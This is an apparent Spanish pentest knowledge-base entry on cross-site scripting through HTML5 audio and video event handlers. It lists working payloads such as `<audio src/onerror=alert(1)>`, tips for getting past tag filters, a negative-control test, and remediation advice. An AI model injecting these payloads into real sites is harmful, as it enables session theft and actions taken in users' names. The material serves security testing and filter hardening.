---
clase: xss
tech: html5-media
cwe: CWE-79
cvss: 6.1 # [derivado] reflejado en contexto HTML
payload: |
  # El vector mas corto del conjunto. Chrome/Firefox/Safari: SI.
  # 'src/onerror' usa la barra como separador de atributos: evita el espacio.
  <audio src/onerror=alert(1)>

  # onloadstart - solo necesita un <source> vacio. Chrome/Firefox/Safari: SI.
  <audio onloadstart="alert(1)"><source>

  # oncanplay - requiere medio valido. Chrome/Firefox/Safari: SI.
  <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>

  # onloadeddata - Chrome/Firefox/Safari: SI.
  <audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>

  # ondurationchange - Chrome/Firefox/Safari: SI.
  <audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>

  # onended - requiere autoplay y que el medio termine. Chrome/Firefox/Safari: SI.
  <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>

  # oncanplaythrough sobre video. Chrome/Firefox/Safari: SI.
  <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
precondicion: "El sink permite inyectar etiquetas HTML. Los vectores se dividen en dos grupos por precondicion: (a) los que NO necesitan un fichero de medios valido y por tanto funcionan en cualquier sitio: 'src/onerror' (dispara justamente porque el medio falla) y 'onloadstart' con <source> vacio; (b) los que SI necesitan un medio reproducible accesible (oncanplay, onloadeddata, ondurationchange, onended)."
como_se_descubre: |
  Señal en recon: filtro que bloquea `<script>`, `<img>` y `<svg>` pero no contempla
  `<audio>` ni `<video>`. Prueba barata y primera eleccion:
  `<audio src/onerror=alert(1)>` — no depende de ningun recurso externo, porque el
  evento que dispara ES el fallo de carga. Si el filtro bloquea el espacio entre
  atributos, la barra de `src/onerror` ya lo esquiva. Si ese falla, probar
  `<audio onloadstart="alert(1)"><source>`, que tampoco necesita medio valido.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: <audio src/onerror=alert(1)>            -> ejecuta (src vacio = error de carga)
  # B: <audio src="validaudio.wav" onerror=alert(1)>  -> NO ejecuta si el fichero existe
  # El par confirma que el disparador es el FALLO de carga, no la presencia del handler.
  # Util para distinguir ejecucion real de un alert generado por otro sink de la pagina.
mata: |
  - El sink codifica `<` y `>` -> muere.
  - CSP sin 'unsafe-inline' para atributos de evento.
  - Sanitizador con allowlist de etiquetas que no incluya audio/video/source.
  - Para el grupo (b): no hay medio reproducible alcanzable -> usar el grupo (a).
fuente: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (PortSwigger XSS cheat sheet; pagina actualizada 2026-10-21). Todos bajo 'Event handlers that do not require user interaction'. Compatibilidad segun los iconos de la pagina."
confianza: alta
fecha: 2026-11-02
---
# [XSS] Máquina de estados de los elementos multimedia HTML5 como superficie de ejecución — `<audio src/onerror=alert(1)>`

## Principio
Los elementos `<audio>` y `<video>` tienen una máquina de estados de carga larga, y
cada transición emite un evento con handler inline disponible. Eso da muchas puertas
distintas al mismo sink. La clave táctica es que **el fallo también es un estado**:
`onerror` se dispara precisamente cuando el medio no carga, así que el vector no
necesita alojar ningún fichero.

## Payload
El vector más corto y el que debe probarse primero:

```html
<audio src/onerror=alert(1)>
```

Dos cosas lo hacen valioso a la vez. Primero, `src` vacío garantiza el error de carga,
así que ejecuta siempre y en cualquier sitio. Segundo, la barra `/` separa los
atributos sin espacio, con lo que esquiva filtros que bloqueen el espacio entre
`src` y `onerror`.

Sin medio válido también sirve, con `<source>` vacío:

```html
<audio onloadstart="alert(1)"><source>
```

Si sí hay un medio reproducible alcanzable, se abren los eventos del ciclo normal:

```html
<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
```

```html
<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
```

```html
<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
```

## Impacto
Igual que cualquier XSS en el origen: robo de sesión, acciones en nombre del usuario,
lectura del DOM autenticado. El interés operativo de esta familia es de evasión, no de
impacto: cuando un sanitizador tiene allowlist de etiquetas pensada para `img`/`svg`,
`audio` suele quedar fuera de la lista, y `src/onerror` cabe en muy pocos caracteres,
lo que ayuda cuando el parámetro tiene longitud limitada.

## Remediación
Codificar `<` y `>` en salida HTML. `# [derivado]`: el sanitizador debe trabajar con
allowlist de etiquetas **y** de atributos, y eliminar cualquier atributo `on*` con
independencia de la etiqueta que lo lleve; filtrar por nombres de etiqueta conocidos
es lo que deja entrar esta familia. CSP sin `unsafe-inline` como segunda capa.
